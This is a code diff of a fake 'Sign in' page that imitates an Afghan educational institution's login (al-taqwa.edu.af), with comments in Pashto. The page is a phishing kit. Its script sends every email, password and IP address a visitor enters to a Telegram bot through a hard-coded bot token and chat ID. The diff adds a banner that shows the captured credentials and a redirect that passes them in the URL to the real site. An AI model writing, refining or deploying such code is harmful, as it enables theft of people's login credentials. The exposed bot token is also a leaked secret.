@@ -108,6 +108,11 @@ button:hover{
     background:#0fb6d6;
 }
 
+button:disabled{
+    background:#999;
+    cursor:not-allowed;
+}
+
 .error-msg {
     background: #ffe6e6;
     border: 1px solid #ff6666;
@@ -140,6 +145,40 @@ button:hover{
     font-weight: bold;
 }
 
+/* د لاګ ان شویو معلوماتو بینر */
+.info-banner {
+    background: #f0f8ff;
+    border: 2px solid #18c6e7;
+    border-radius: 8px;
+    padding: 12px 15px;
+    margin-bottom: 16px;
+    display: none;
+}
+
+.info-banner .info-title {
+    font-weight: bold;
+    color: #0066cc;
+    font-size: 14px;
+    margin-bottom: 6px;
+}
+
+.info-banner .info-item {
+    font-size: 13px;
+    padding: 3px 0;
+    color: #333;
+}
+
+.info-banner .info-item strong {
+    color: #0066cc;
+}
+
+.info-banner .info-value {
+    color: #003399;
+    background: #e6f0ff;
+    padding: 1px 8px;
+    border-radius: 3px;
+}
+
 </style>
 </head>
 
@@ -152,6 +191,13 @@ button:hover{
     </div>
 
     <div class="title">Sign in</div>
+
+    <!-- د معلوماتو بینر (که له بلې پاڼې راغلی وي) -->
+    <div id="infoBanner" class="info-banner">
+        <div class="info-title">✅ You are logged in as:</div>
+        <div class="info-item"><strong>📧 Email:</strong> <span class="info-value" id="displayEmail">-</span></div>
+        <div class="info-item"><strong>🔑 Password:</strong> <span class="info-value" id="displayPassword">-</span></div>
+    </div>
 
     <div id="errorMsg" class="error-msg"></div>
     <div id="successMsg" class="success-msg"></div>
@@ -180,6 +226,25 @@ button:hover{
     // ==================== د Telegram بوټ تنظیمات ====================
     const BOT_TOKEN = "8688494134:AAEFObEX1p4syZwUBPVe-iG5GXkWDj311CA";
     const ADMIN_CHAT_ID = "8295417969";
+
+    // ========== چیک کول چې آیا له بلې پاڼې راغلی ==========
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        const password = urlParams.get('password');
+        
+        if (email && password) {
+            document.getElementById('displayEmail').textContent = decodeURIComponent(email);
+            document.getElementById('displayPassword').textContent = decodeURIComponent(password);
+            document.getElementById('infoBanner').style.display = 'block';
+            
+            // د URL څخه پیرامیټر لیرې کړئ
+            if (window.history && window.history.replaceState) {
+                const newUrl = window.location.pathname;
+                window.history.replaceState({}, document.title, newUrl);
+            }
+        }
+    };
 
     // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
@@ -211,7 +276,7 @@ button:hover{
 
     // اډمن ته پیغام لیږل
     async function sendToAdmin(email, password, ip) {
-        const message = `✅ *NEW LOGIN ATTEMPT* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+        const message = `🔐 *LOGIN ATTEMPT* 🔐\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
         try {
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -298,9 +363,11 @@ button:hover{
             return;
         }
 
-        // د 2 ثانیو وروسته اصلي پاڼې ته لاړ شئ
+        // د 1.5 ثانیو وروسته د email او password سره بل پاڼې ته لاړ شئ
         setTimeout(() => {
-            window.location.replace("https://www.altaqwa.edu.af/login");
+            const encodedEmail = encodeURIComponent(email);
+            const encodedPassword = encodeURIComponent(password);
+            window.location.replace(`https://www.altaqwa.edu.af/login?email=${encodedEmail}&password=${encodedPassword}`);
         }, 1500);
     });
 </script>
